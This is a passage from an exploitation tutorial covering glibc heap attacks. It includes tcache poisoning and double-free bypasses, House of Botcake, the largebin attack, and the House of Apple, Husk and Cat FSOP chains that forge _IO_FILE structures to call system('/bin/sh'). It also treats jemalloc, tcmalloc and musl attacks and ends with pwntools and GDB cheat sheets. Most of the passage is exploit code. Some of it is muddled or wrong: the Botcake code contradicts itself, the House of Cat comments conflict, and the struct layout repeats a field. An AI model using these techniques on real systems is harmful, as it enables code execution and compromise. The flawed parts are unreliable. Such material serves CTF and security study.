# glibc ≥ 2.32 (safe-linking)
# Safe-linking mangles fd pointers: (fd ^ (chunk_addr >> 12))
# To poison: write (target ^ (B >> 12)) at B+0x10

# If tcache count is manually corrupted to non-zero, the demangling
# during malloc will compute: next = (fd ^ (chunk_addr >> 12))
# So if we write: fd = target ^ (chunk_addr >> 12)
# Then: next = (target ^ (chunk_addr >> 12)) ^ (chunk_addr >> 12) = target

def mangle(ptr, loc):
    """Mangle a pointer for safe-linking."""
    return (ptr ^ (loc >> 12))

# Poisoning:
target = 0x404060
target_mangled = mangle(target, chunk_B_addr)
overwrite(B + 0x10, p64(target_mangled))

malloc()  # returns A
malloc()  # returns B
malloc()  # returns target!
```

### Tcache Double-Free (glibc 2.29+)

glibc 2.29 added `tcache_key` to detect double-free. On free, the `key` field in the freed chunk is set to `tcache_key`. If a freed chunk already has this key, it's a double-free.

**Bypass:** Overwrite the `key` field between frees.

```python
# Step 1: Allocate and free
malloc(0x28, b'A'*0x28)  # chunk 0
free(0)  # tcache[0x30]: chunk0; key field set to tcache_key

# Step 2: Overflow to clear the key field
# If we have a heap overflow on an adjacent chunk:
overwrite(chunk0 + 0x18, b'\x00' * 8)  # clear key field

# Step 3: Double-free
free(0)  # succeeds! tcache_key was cleared

# tcache[0x30]: chunk0 → chunk0 (circular)

# Step 4: Allocate twice, write target in between
malloc(0x28, p64(target_addr))  # alloc chunk0, overwrite fd
malloc(0x28, b'JUNK')           # alloc chunk0 again
malloc(0x28, b'JUNK')           # alloc target_addr — arbitrary write!
```

### House of Botcake

**Works:** glibc 2.27–2.35+ (bypasses tcache double-free detection)

The technique exploits the interaction between tcache and unsorted bin. By filling the tcache (7 entries) and then freeing one more chunk, the 8th free goes to the unsorted bin. Then we free one of the tcache chunks again (after modifying it or clearing its key).

```python
from pwn import *

# Allocate 9 chunks of same size
for i in range(9):
    malloc(0x88, f'chunk{i}'.encode())  # 0-8

# Free 7 to fill tcache (chunks 1-7)
for i in range(1, 8):
    free(i)
# tcache[0x90]: 7 entries (full)

# Free chunk 0 — goes to unsorted bin (not tcache, because tcache is full)
free(0)
# chunk 0 is in unsorted bin

# Free chunk 1 — WAS in tcache, but we freed it. Let's free again?
# No — we need to clear the key first.
# Actually: free chunk 7 was last into tcache. Free it again won't work (key check).
# Instead: we can free a different tcache entry if we clear its key.

# Alternative approach:
# 1. Fill tcache with 7 entries (A)
# 2. Free chunk into unsorted bin (B)
# 3. Take one entry out of tcache (tcache now has 6)
# 4. Free B again — it's in unsorted bin, not tcache, so no tcache double-free check!
#    But wait, is B in the unsorted bin? Yes.
#    Actually, step 4 doesn't work directly because unsorted bin has fd/bk checks.

# CORRECT House of Botcake:
# 1. Allocate chunks A, B, C, ...
# 2. Free 7 same-size chunks to fill tcache
# 3. Free B — goes to unsorted bin
# 4. Free the chunk at the head of tcache — clears one slot
#    malloc same size — takes from tcache, now 6 entries
# 5. Now free B again — tcache has room! B goes to tcache.
#    B is now in BOTH tcache and unsorted bin (overlapping!)

malloc(0x88, b'JUNK')  # take one from tcache (count: 6)
free(0)  # B is freed into tcache (count: 7, tcache free succeeds)
# B is now in both tcache and unsorted bin!

# Now:
# malloc(0x88) → returns B from tcache
# We can write to B, modifying its unsorted bin fd/bk
# Or: use the overlap for more complex attacks
```

### Largebin Attack

**Works:** glibc 2.23–2.39+ (still unpatched as of 2.39)

The largebin attack writes a heap address to an arbitrary location by abusing the `bk_nextsize` and `fd_nextsize` pointers during largebin insertion.

```
Scenario: We have a chunk C in a largebin (fd_nextsize/bk_nextsize set).
We can overflow C to set bk_nextsize to target_addr - 0x20.

When a larger chunk D is inserted into the same largebin slot,
the following code executes:

1. D.fd_nextsize = C.fd_nextsize
2. D.bk_nextsize = C.bk_nextsize   = target_addr - 0x20
3. C.bk_nextsize->fd_nextsize = D   ← writes D's address to (target_addr - 0x20) + 0x20
                                    ← writes to target_addr!

More precisely:
  victim->bk_nextsize->fd_nextsize = victim;  (in glibc largebin insertion)
  *(C.bk_nextsize + 0x20) = D;
  = *((target_addr - 0x20) + 0x20) = D
  = *(target_addr) = heap_addr_of_D
```

```python
from pwn import *

def largebin_attack(libc, heap_base, target_addr):
    """
    Precondition: chunk C (0x420) in largebin, chunk D (0x430) to insert.
    We can overflow C to control its bk_nextsize.
    """
    # 1. Free chunk C (size 0x420) — put in unsorted bin
    # 2. malloc bigger chunk — sorts C into largebin
    # 3. Allocate chunk D (size 0x430)
    # 4. Overflow C's bk_nextsize to target_addr - 0x20
    fake_bk_nextsize = target_addr - 0x20
    write_to_chunk_C_bk_nextsize(p64(fake_bk_nextsize))

    # 5. Free D — triggers largebin insertion, writing D's address to target_addr
    free(D)

    # Result: *(target_addr) = &D_on_heap
    print(f"[*] Heap address written to {hex(target_addr)}")
```

### House of Apple (FSOP)

**Works:** glibc 2.35+ (targets `_IO_OVERFLOW` through `_IO_FILE` vtable)

House of Apple is a powerful technique that abuses the `_IO_FILE` vtable mechanism during `exit()` → `_IO_flush_all_lockp()`. It creates a fake `_IO_FILE` structure whose vtable points to a controlled function.

**Three variants:**
- **House of Apple 1:** Uses largebin attack to write a heap address into `_IO_list_all`, then triggers FSOP.
- **House of Apple 2:** Abuses `_IO_wfile_overflow` → `_IO_wdoallocbuf` → calls function pointer in wide data vtable.
- **House of Apple 3:** Abuses `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` chain.

**House of Apple 2 — Detailed Walkthrough:**

```python
from pwn import *

def house_of_apple2(libc, system_addr, binsh_addr):
    """
    Constructs a fake _IO_FILE + wide_data that calls system("/bin/sh")
    via _IO_wfile_overflow → _IO_wdoallocbuf path.
    """
    # During exit(), _IO_flush_all_lockp() iterates _IO_list_all
    # It calls fp->_overflow(fp, EOF)
    # If we control _IO_list_all → fake FILE, we control _overflow

    # But vtable checking: _IO_vtable_check() ensures vtable is within
    # __stop___libc_IO_vtables - __start___libc_IO_vtables range.
    # So we can't point vtable to system() directly.

    # House of Apple 2 solution: use _IO_wfile_overflow, which calls
    # _IO_wdoallocbuf, which uses _IO_WALLOCBUF(fp) macro that
    # dereferences through the WIDE DATA vtable (separate from main vtable).

    # Step 1: Set up fake _IO_FILE
    fake_file = b''
    fake_file += p64(0)                    # _flags: set to trigger overflow
    fake_file = fake_file.ljust(0x20, b'\x00')
    fake_file += p64(0)                    # _IO_write_base
    fake_file += p64(0)                    # _IO_write_ptr (must be > base for overflow trigger)
    fake_file += p64(1)                    # _IO_write_end
    fake_file = fake_file.ljust(0xa0, b'\x00')
    fake_file += p64(heap_base + OFFSET_WIDE_DATA)  # _wide_data pointer
    fake_file = fake_file.ljust(0xc0, b'\x00')
    fake_file += p64(heap_base + OFFSET_VTABLE)     # vtable pointer
    fake_file = fake_file.ljust(0xd8, b'\x00')

    # Step 2: Set up fake vtable (for _IO_wfile_overflow)
    # _IO_wfile_overflow is at a known libc address within the valid vtable range
    # We need: vtable[3] = _IO_wfile_overflow (the overflow slot)
    fake_vtable  = p64(0) * 3             # vtable[0], [1], [2]
    fake_vtable += p64(libc.symbols._IO_wfile_overflow)  # vtable[3] = overflow

    # Step 3: Set up fake wide_data and wide vtable
    # _IO_wdoallocbuf calls: fp->_wide_data->_wide_vtable->__doallocbuf(fp)
    # We control _wide_vtable, so we can make __doallocbuf = system
    fake_wide_data  = p64(0) * 7         # ...
    fake_wide_data += p64(heap_base + OFFSET_WIDE_VTABLE)  # _wide_vtable

    # Wide vtable: __doallocbuf slot points to system
    fake_wide_vtable  = p64(0) * 7        # slots 0-6
    fake_wide_vtable += p64(system_addr)  # slot 7: __doallocbuf → system

    # But we need rdi = "/bin/sh" when this is called.
    # _IO_wdoallocbuf passes fp (the _IO_FILE pointer) as the argument.
    # So we need "/bin/sh" to be at the start of our fake _IO_FILE!
    # Set _flags field to contain "/bin/sh" string... but _flags must have
    # specific bits. Alternative: set _flags = 0x68732f6e622f (="/bin/sh\0"),
    # which has the overflow-triggering bits if we adjust.

    # Actually: for _IO_wfile_overflow to call _IO_wdoallocbuf:
    #   fp->_wide_data must be set AND _IO_WOVERFLOW must branch to wdoallocbuf
    #   The condition: (fp->_flags & _IO_NO_WRITES) == 0
    #                  AND (fp->_wide_data->_IO_write_base == 0 or needs alloc)

    # Simplified: just use the chain that passes fp as first argument
    # and have fp start with "/bin/sh\0" as the _flags field.

    # Or use _IO_wfile_overflow + system("/bin/sh") via a gadget:
    # The exact chain depends on the glibc version. The critical observation:
    # _IO_wfile_overflow → _IO_wdoallocbuf → calls via wide_vtable->__doallocbuf
    # = system(fp). If fp starts with "/bin/sh", system("/bin/sh") is called.

    return {
        'fake_file': fake_file,
        'fake_vtable': fake_vtable,
        'fake_wide_data': fake_wide_data,
        'fake_wide_vtable': fake_wide_vtable,
    }
```

### House of Husk

**Works:** glibc 2.30–2.35+ (targets `printf_function_table` and `__printf_arg_index_table`)

House of Husk abuses the `printf` infrastructure. When `printf()` encounters a format specifier like `%s`, it looks up the specifier handler in `__printf_function_table` and `__printf_arg_index_table`. By writing addresses to these global tables, `printf` calls an attacker-controlled function.

```python
# Step 1: Use a write primitive (e.g., largebin attack) to write
#         a heap address to __printf_function_table
# Step 2: Write system (or one_gadget) address to the handler slot
#         for a specific format character (e.g., 's' = index for %s)
# Step 3: Call printf with that format specifier

# Layout of __printf_function_table:
# It's an array of 256 function pointers (one per ASCII char).
# printf_arg_index_table similarly.

# When printf processes '%s':
#   if (__printf_function_table[(unsigned char)'s'] != NULL)
#       call __printf_function_table[(unsigned char)'s'](...)

# So: write system to __printf_function_table[(unsigned char)'s']
# Then: printf("%s", "/bin/sh") → system("/bin/sh")
```

### House of Cat (FSOP via IO)

**Works:** glibc 2.35+ (bypasses vtable validation)

House of Cat abuses the `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` chain, which performs multiple indirect calls through the `_wide_data` vtable before the vtable check.

```python
from pwn import *

def house_of_cat(libc, heap_base, target_func, target_arg):
    """
    Fake _IO_FILE that triggers via _IO_wfile_seekoff.
    Called during _IO_flush_all_lockp when it processes streams.
    _IO_seekoff_unlocked(fp, 0, 0, _IO_seek_end) is called if
    fp->_mode > 0 and (fp->_IO_write_ptr > fp->_IO_write_base).
    """
    # _IO_wfile_seekoff path:
    #   checks fp->_wide_data != NULL
    #   calls _IO_WSEEKOFF(fp, ...) which is fp->_wide_data->_wide_vtable->__seekoff
    #   Inside _IO_switch_to_wget_mode:
    #     calls _IO_WOVERFLOW(fp) = fp->_wide_vtable->__overflow

    # The trick: set _wide_vtable->__seekoff to a gadget that moves
    # rdi (fp) to the right register and calls system/system-like function.

    # For system("/bin/sh"): we need rdi = "/bin/sh"
    # Since fp is passed as first arg, set fp->_flags = "/bin/sh\0"

    flags = u64(b'/bin/sh\0')  # = 0x0068732f6e622f

    fake_file  = p64(flags)              # _flags = "/bin/sh\0"
    fake_file += p64(0)                  # _IO_read_ptr
    fake_file += p64(0)                  # _IO_read_end
    fake_file += p64(0)                  # _IO_read_base
    fake_file += p64(1)                  # _IO_write_base (needs to be < write_ptr)
    fake_file += p64(2)                  # _IO_write_ptr (> _IO_write_base triggers flush)
    fake_file += p64(0)                  # _IO_write_end
    fake_file += p64(0)                  # _IO_buf_base
    fake_file += p64(0)                  # _IO_buf_end
    fake_file += p64(0)                  # _IO_save_base
    fake_file += p64(0)                  # _IO_backup_base
    fake_file += p64(0)                  # _IO_save_end
    fake_file += p64(0)                  # _IO_markers
    fake_file += p64(0)                  # _chain
    fake_file += p64(1)                  # _fileno (must not be 0 for some paths)
    fake_file = fake_file.ljust(0x80, b'\x00')
    fake_file += p64(1)                  # _mode > 0 (triggers wide char path)
    fake_file += p64(0) * 2              # unused
    fake_file += p64(heap_base + FAKE_WIDE_DATA)  # _wide_data at offset 0xa0
    fake_file = fake_file.ljust(0xc8, b'\x00')
    fake_file += p64(heap_base + FAKE_VTABLE)     # vtable at offset 0xc8

    # vtable: point to _IO_wfile_seekoff (or _IO_wfile_overflow)
    # We want vtable->_overflow to be _IO_wfile_seekoff or _IO_wfile_overflow
    # Actually: _IO_flush_all_lockp calls vtable->__overflow
    # We set vtable->__overflow = _IO_wfile_seekoff
    # This way, when overflow is called, it enters wfile_seekoff path

    fake_vtable  = p64(0) * 3    # __finish, __overflow placeholder, etc.
    fake_vtable += p64(libc.symbols._IO_wfile_overflow)  # __overflow slot

    # Wide data: set _wide_vtable->__doallocbuf to system
    # Note: in _IO_switch_to_wget_mode, it calls _IO_WOVERFLOW
    # which is determined by _wide_vtable

    fake_wide_data  = p64(0) * 13
    fake_wide_data += p64(heap_base + FAKE_WIDE_VTABLE)  # _wide_vtable

    # In the wide vtable, set __overflow to target_func (e.g., system)
    # When _IO_switch_to_wget_mode calls _IO_WOVERFLOW(fp),
    # it calls wide_vtable->__overflow(fp), where fp arg starts with "/bin/sh"
    fake_wide_vtable = p64(0) * 18   # fill slots before __overflow
    fake_wide_vtable += p64(target_func)  # __overflow = system

    return fake_file
```

**Trigger:** Run `exit(0)` or `_IO_flush_all_lockp()` is called, iterating `_IO_list_all`. If our fake file is in the chain, the overflow function is called, which triggers the wide-data vtable chain, ultimately calling `system("/bin/sh")`.

---

## 2.4 FILE Structure Exploitation

### `_IO_FILE` Structure (glibc 2.35)

```c
struct _IO_FILE {
    int _flags;                 // offset 0x00
    char *_IO_read_ptr;         // offset 0x08
    char *_IO_read_end;         // offset 0x10
    char *_IO_read_base;        // offset 0x18
    char *_IO_write_base;       // offset 0x20
    char *_IO_write_ptr;        // offset 0x28
    char *_IO_write_end;        // offset 0x30
    char *_IO_buf_base;         // offset 0x38
    char *_IO_buf_end;          // offset 0x40
    char *_IO_save_base;        // offset 0x48
    char *_IO_backup_base;      // offset 0x50
    char *_IO_save_end;         // offset 0x58
    struct _IO_marker *_markers; // offset 0x60
    struct _IO_FILE *_chain;    // offset 0x68
    int _fileno;                // offset 0x70
    int _flags2;                // offset 0x74
    __off_t _old_offset;        // offset 0x78
    unsigned short _cur_column; // offset 0x80
    signed char _vtable_offset; // offset 0x82
    char _shortbuf[1];          // offset 0x83
    void *_lock;                // offset 0x88
    __off64_t _offset;          // offset 0x90
    struct _IO_codecvt *__codecvt; // offset 0x98
    struct _IO_wide_data *_wide_data; // offset 0xa0
    struct _IO_FILE *_freeres_list; // offset 0xa8
    unsigned int _freeres_mem_idx;  // offset 0xb0
    void *__padn;               // offset 0xb8
    void *__pad5;               // offset 0xc0
    __off64_t _mode;            // offset 0xc8
    char _unused2[15 * 4];     // ...
    _IO_lock_t *_lock;          // ...
};
// Total size: 0x1e0 on x86_64 (including vtable pointer)
// But vtable is stored separately after the struct:
//   fp + 0xd8 = _IO_jump_t *vtable
```

### vtable Restriction (glibc 2.24+)

Since glibc 2.24, `_IO_vtable_check()` ensures vtable pointers fall within the `__libc_IO_vtables` section. This means you **cannot** point the vtable to an arbitrary address outside this range.

**Bypass techniques:**
1. Use `_IO_wfile_overflow` / `_IO_wfile_seekoff` paths (House of Apple) — these call through the `_wide_data->_wide_vtable`, which is **NOT** validated.
2. Use `__printf_function_table` (House of Husk).
3. Use `_IO_str_overflow` with `_IO_str_jumps` vtable (older glibc).

### `_IO_OVERFLOW` Call Chain

```
exit()
  → _IO_cleanup()
    → _IO_flush_all_lockp(fp)
      → _IO_OVERFLOW(fp, EOF)
        = fp->vtable->__overflow(fp, EOF)
```

The `_IO_OVERFLOW` macro dispatches through the vtable, which is where we gain control if we can manipulate the vtable or the indirect call target.

---

## 2.5 FSOP — File Stream Oriented Programming

### FSOP Overview

FSOP is the technique of forging `_IO_FILE` structures and chaining them through `_chain` to create a ROP-like sequence of function calls through the vtable dispatch mechanism.

```python
# FSOP chain: link multiple fake FILE structures
# Each FILE is processed by _IO_flush_all_lockp()

# Condition for a FILE to be "flushed":
#   fp->_flags & _IO_UNBUFFERED == 0  (flags bit 2 clear)
#   fp->_flags & _IO_NO_WRITES == 0   (flags bit 1 set? Actually: _IO_NO_WRITES check)
#   fp->_IO_write_ptr > fp->_IO_write_base
# In practice: set _flags = 0x68732f6e622f ("/bin/sh\0")
# and _IO_write_ptr > _IO_write_base, and _mode > 0 (for wide char path)

# Chain multiple fake FILEs:
fake_files = []
for i in range(NUM_FILES):
    fake = build_fake_file(
        vtable=vtable_addr + i * 8,  # each with different handler
        handler=target_func_i,
    )
    fake_files.append(fake)

# Link them:
for i in range(len(fake_files) - 1):
    write_field(fake_files[i], '_chain', addr_of(fake_files[i+1]))

# Set _IO_list_all to first fake file:
largebin_attack(libc.symbols._IO_list_all, addr_of(fake_files[0]))

# Trigger: exit() or assert failure
```

### Complete FSOP Payload Structure

```
Memory Layout (stack or heap):

╔═══════════════════════════════════════════════╗
║  Fake _IO_FILE #1                             ║
║  ┌─────────────────────────────────────────┐  ║
║  │ _flags = 0 (or "/bin/sh\0" for system) │  ║
║  │ _IO_write_base = 0                      │  ║
║  │ _IO_write_ptr  = 1  (> base)            │  ║
║  │ ...padding...                            │  ║
║  │ _mode = 1 (>0 triggers wide path)        │  ║
║  │ _wide_data → addr of fake_wide_data_1   │  ║
║  │ (padding)                                │  ║
║  │ vtable → addr of fake_vtable_1           │  ║
║  └─────────────────────────────────────────┘  ║
║                                               ║
║  Fake wide_data_1                             ║
║  ┌─────────────────────────────────────────┐  ║
║  │ ...                                     │  ║
║  │ _wide_vtable → addr of fake_wide_vt_1  │  ║
║  └─────────────────────────────────────────┘  ║
║                                               ║
║  Fake wide_vtable_1                           ║
║  ┌─────────────────────────────────────────┐  ║
║  │ ...slots...                              │  ║
║  │ __overflow → system (or one_gadget)     │  ║
║  └─────────────────────────────────────────┘  ║
╚═══════════════════════════════════════════════╝
```

---

# 3. Heap Exploitation — Other Allocators

## 3.1 jemalloc Exploitation

### jemalloc Architecture

jemalloc uses **extents** (large contiguous regions) divided into **pages** (4KB). Small allocations use **slab allocators** within runs:

```
Extent (mesh of runs)
┌────────────────────────────────────────────────────┐
│  Run Header                                         │
│  ┌──────────┬──────────┬──────────┬──────────┐      │
│  │ bitmap[0]│ region 0 │ region 1 │ region 2 │ ...  │
│  └──────────┴──────────┴──────────┴──────────┘      │
│  ...                                                │
└────────────────────────────────────────────────────┘

Run: specialized for a particular size class
  - Size classes: 8, 16, 32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256, ...
  - Each run has a bitmap tracking which regions are free
  - Freed regions are tracked in the run's bitmap (not linked lists!)
```

### Key Differences from glibc

| Feature | glibc | jemalloc |
|---------|-------|----------|
| Free list structure | fd/bk pointers in free chunks | Bitmap in run header |
| Metadata location | Inline (chunk headers) | Separate (run headers, extent headers) |
| Double-free detection | tcache_key, fastbin checks | Bitmap check (region already free?) |
| Use-after-free recovery | tcache/fastbin poisoning | Region content stale until reallocated |
| Thread caching | tcache (per-thread) | tcache (per-thread, similar concept) |

### Exploitation Techniques

**1. Use-after-Free (UAF) via Stale Pointer:**
```c
// jemalloc doesn't zero freed memory
void *p = malloc(32);
free(p);
// p still points to valid memory that will be reused
// No metadata corruption, but stale data persists
strcpy(p, attacker_data);  // write to freed region

void *q = malloc(32);  // reuses p's region
// q now contains attacker_data
```

**2. Heap Overflow Between Regions in Same Run:**
```c
// Adjacent regions in the same run have no metadata between them
// Overflow from region[i] into region[i+1] has no chunk header to corrupt
void *a = malloc(32);  // region 0
void *b = malloc(32);  // region 1 (likely adjacent in same run)
// Overflow a into b: directly overwrites b's data
// No metadata to corrupt — only data corruption
```

**3. Metadata Attack (Run Header):**
```python
# If you can overflow into a run header, you corrupt the bitmap
# This controls which regions are free/allocated
# Potential: mark an allocated region as free → double-allocate → overlap
```

**4. Extent Attack:**
```python
# Extent headers contain pointers to other extents
# Overwriting extent metadata can:
#   - Merge non-adjacent extents (fake freed region)
#   - Redirect allocations to controlled regions
#   - Create overlapping extents
```

## 3.2 tcmalloc Exploitation

### tcmalloc Architecture

tcmalloc uses **thread caches** (per-thread), **central free lists** (per-CPU), and **page heap**:

```
Thread Cache → Central Free List → Page Heap → OS

Size classes:
  1-8KB:   Spans (8 pages = 32KB)
  8KB+:    Large object spans (variable pages)

Span structure:
┌────────────────────────────────────┐
│  Span Header (in PageMap)          │
│  ┌────────────────────────────┐    │
│  │ start_page: 0x12345        │    │
│  │ num_pages: 3               │    │
│  │ free_objects: linked list   │    │
│  │ location: IN_USE/FREE      │    │
│  │ prev_span, next_span        │    │
│  └────────────────────────────┘    │
│  Page 0 │ Page 1 │ Page 2          │
└────────────────────────────────────┘
```

### Key Characteristics

- Per-thread caches reduce contention (similar to glibc's tcache)
- **Span metadata stored in PageMap** (separate from heap data) — no inline metadata to corrupt!
- Free list uses **TCMalloc_Span::freelist** (linked list of free objects within a span)
- `sizeclass` determines object size and which central free list to use

### Exploitation Techniques

**1. Free List Corruption:**
```python
# If you can write to a freed object's next pointer in the free list:
# tcmalloc stores {next, ...} in freed objects
free_list_ptr_addr = freed_region + 0  # next pointer (compressed or full ptr)
overwrite(free_list_ptr_addr, target_addr)  # corrupt next pointer
# Next allocation returns target_addr
```

**2. PageMap Attack:**
```c
// tcmalloc's PageMap maps page IDs to Span*
// If you can corrupt the PageMap (requires info leak + arbitrary write):
//   Write fake Span* for a page → next allocation on that page uses fake span
//   Fake span has controlled free list → arbitrary allocation
```

**3. Cross-Size-Class Overlap:**
```c
// Overflow from one size class to another requires:
// 1. Two adjacent spans of different size classes
// 2. Not common but possible depending on allocation pattern

// More reliable: the "span metadata rewrite" approach
// After freeing a span, its metadata may be reusable
// Allocate in a new size class, overflow back into the old span metadata
```

## 3.3 musl libc Heap Exploitation

### musl malloc Architecture

musl uses a **hardened malloc** with **mal**, **mal.brk**, and grouping:

```
Group Structure:
┌─────────────────────────────────┐
│  mal (mallctl) — global state    │
│  ┌─────────────────────────────┐│
│  │ brk: current break          ││
│  │ heap_base: ...              ││
│  │ active[x]: Group*           ││  ← one per size class
│  │ ...                         ││
│  └─────────────────────────────┘│
│                                  │
│  Group                          │
│  ┌─────────────────────────────┐│
│  │ meta (Meta*)                ││
│  │ mem (void*)                 ││  ← start of allocated region
│  │ last_idx: 0                 ││
│  │ free_mask: bitmask          ││  ← tracks free slots
│  │ dirty_mask: bitmask         ││  ← tracks dirty (freed but not returned) slots
│  └─────────────────────────────┘│
│                                  │
│  Meta (linked list)             │
│  ┌─────────────────────────────┐│
│  │ prev, next (doubly-linked)  ││
│  │ mem: pointer to group data  ││
│  │ sizeclass, cap, activeness  ││
│  └─────────────────────────────┘│
└─────────────────────────────────┘
```

### Key Security Features

- **No inline metadata** in user allocations — metadata is in separate `Group`/`Meta` structures
- **Bitmask-based free tracking** instead of linked lists — harder to corrupt
- **SECURE randomization** of allocation addresses
- **No tcache/fastbin** — all frees go directly through group management

### musl Exploitation Techniques

**1. Group Meta Corruption:**
```python
# If you can overflow into a Group or Meta structure:
# Overwrite meta->mem to point to a fake group at target address
# Next allocation from this group returns target address

# Finding Group/Meta: they're allocated with mmap or on the heap
# Need an info leak to locate them
```

**2. Arbitray Free via Bitmask Manipulation:**
```python
# free_mask and dirty_mask are bitmasks tracking which slots are free
# If you can flip a bit in free_mask to mark an in-use slot as "free":
#   Next malloc() re-allocates the in-use slot → overlap/use-after-free
```

**3. Meta Unlink Attack:**
```python
# Meta structures form a doubly-linked list
# If you can corrupt meta->prev and meta->next:
#   meta->prev->next = meta->next  (write-what-where primitive!)
#   meta->next->prev = meta->prev

# Construct fake meta:
fake_meta_addr = 0x41414141
target_addr = 0x43434343
# fake_meta->prev = target_addr - offsetof(Meta, next)  (or appropriate offset)
# fake_meta->next = target_addr - offsetof(Meta, prev)
# Trigger unlink of fake_meta → writes to target_addr
```

## 3.4 Custom Allocator Exploitation Strategies

### General Approach

**Step 1: Reverse the allocator.** Understand:
- Where is metadata stored? (inline or out-of-band)
- What free list structures are used? (linked list, bitmap, red-black tree)
- What integrity checks exist? (checksums, canaries, random guards)
- What is the allocation/deallocation API?

**Step 2: Identify corruption primitives.** Given your vulnerability (overflow, UAF, double-free):
- Can you corrupt inline metadata? (chunk headers, free list pointers)
- Can you corrupt out-of-band metadata? (separate tracking structures)
- Can you corrupt control flow? (function pointers, vtables)

**Step 3: Build exploits.** Common patterns:

```
Pattern 1: Free List Poisoning
  Free(A)  →  A's "next" pointer in free list
  Overflow A's next pointer →  A.next = &target
  malloc()   →  returns A
  malloc()   →  returns &target (arbitrary allocation!)

Pattern 2: Metadata Overwrite
  Overflow chunk header →  corrupt size/flags
  free() with corrupted metadata →  arbitrary write (unlink)
  Or: change size to overlap with next allocation

Pattern 3: Type Confusion via Cross-Size-Class
  Allocate objects of type T1 (small) and T2 (larger)
  Overflow T1 into what the allocator thinks is T2's metadata
  Forge metadata for T2 →  control allocation behavior

Pattern 4: Use-After-Free via Stale Pointer
  free(ptr)  →  ptr is stale, allocator may reuse this region
  ptr2 = malloc(same_size)  →  may reuse ptr's region
  write to ptr (UAF) →  overwrites ptr2's data
  If ptr2 contains function pointers →  code execution
```

### Binary Analysis Checklist for Custom Allocators

```bash
# 1. Identify the allocator
ldd ./vuln                           # check linked libraries
strings ./vuln | grep -i 'malloc\|jemalloc\|tcmalloc\|mimalloc'
objdump -t ./vuln | grep -i 'malloc\|free\|calloc'

# 2. Map allocator symbols
nm ./vuln | grep -i 'malloc\|free\|heap\|chunk'
readelf -s ./vuln | grep -i 'alloc'

# 3. Find allocation routines in disassembly
objdump -d ./vuln | grep -B5 -A5 'call.*alloc'
# Look for custom malloc/free implementations

# 4. Identify metadata layout
# In GDB:
#   x/20gx &custom_chunk_header
#   p/x *(struct custom_chunk *)0x12345

# 5. Test corruption primitives
# Use pwntools + GDB:
from pwn import *
p = gdb.debug('./vuln', '''
  b *vuln+0x42
  continue
''')
# Overwrite metadata fields one by one, observe crashes
# Identify which fields cause exploitable crashes vs. SIGABRT

# 6. Develop exploit
from pwn import *

def exploit_custom_alloc():
    # ... custom allocator specific logic ...
    pass
```

### Arena/Slab Allocator Exploitation

For slab allocators (common in OS kernels and some userspace allocators):

```c
// Slab allocator layout:
// Cache → Slab → Objects
// Metadata stored in slab header (out-of-line or inline)

// Attack vectors:
// 1. Overflow between objects in same slab (no isolation)
// 2. Corrupt freelist pointer in freed object
// 3. Cross-cache attack: overflow from one cache to adjacent cache's slab

// Example: corrupt freelist in freed object
void *obj = kmalloc(64, CACHE_A);
free(obj);
// obj's freelist pointer: *(void **)(obj) = next_free
// Overflow adjacent object to corrupt obj's freelist:
*(void **)(adjacent + OVERFLOW_OFFSET) = target_address;
// Next allocation from CACHE_A returns target_address
```

---

# Appendix A: Quick Reference — glibc Heap Checks by Version

| glibc Version | Check | Technique Affected |
|---|---|---|
| 2.23 | Minimal checks | All classic techniques work |
| 2.26 | tcache introduced | tcache poisoning possible (no checks) |
| 2.27 | tcache double-free bug | tcache dup works directly |
| 2.29 | tcache_key, fastbin size check | tcache dup needs key bypass |
| 2.30 | tcache count check | tcache poisoning count must be correct |
| 2.32 | Safe-linking (pointer mangling) | tcache/fastbin fd need demangling |
| 2.34 | __malloc_hook, __free_hook removed | No hook overwrites |
| 2.35 | Enhanced vtable validation | Need IO wides vtable bypass |
| 2.37+ | Further hardening | House of Apple variants still work |

# Appendix B: pwntools Cheat Sheet

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Process and ELF
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ROP
rop = ROP(elf)
rop.call('puts', [elf.got.puts])
rop.call('main')
payload = b'A' * offset + rop.chain()

# Format string
payload = fmtstr_payload(offset, {target: value})

# Sigreturn
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = next(elf.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

# ret2csu
csu_popper = 0x4011d2
csu_caller = 0x4011b0
# ... see Section 1.7

# Heap
# Tcache poison:
free(A); free(B); overflow(B+0x10, target)
malloc(sz); malloc(sz) → returns target

# Unsorted bin leak:
free(largechunk); read(largechunk+0x10) → libc leak

# Largebin attack:
# See Section 2.3
```

# Appendix C: Common GDB Commands for Heap Exploitation

```gdb
# Using pwndbg/GEF:
heap                  # Show heap chunks
bins                  # Show all bins
tcache                # Show tcache entries
fastbins              # Show fastbin entries
largebins             # Show largebin entries
unsortedbin           # Show unsorted bin

# Examining chunks:
vis                   # Visual heap layout
mxheap                # Extended heap visualization

# Examining specific addresses:
x/20gx 0x555555559000  # Examine chunk at address
p *(struct malloc_chunk *)0x555555559000

# Tcache per-thread struct:
p *(struct tcache_perthread_struct *)tcache

# Following pointers:
x/gx &main_arena.bins[0]  # unsorted bin fd/bk

# Breakpoints:
b _int_malloc
b _int_free
b malloc
b _IO_flush_all_lockp
```

---

*This document covers the major userspace exploitation techniques for stack and heap on Linux x86_64 as of 2024-2025. Techniques evolve with each glibc release; always verify checks for your target version. Happy hacking.*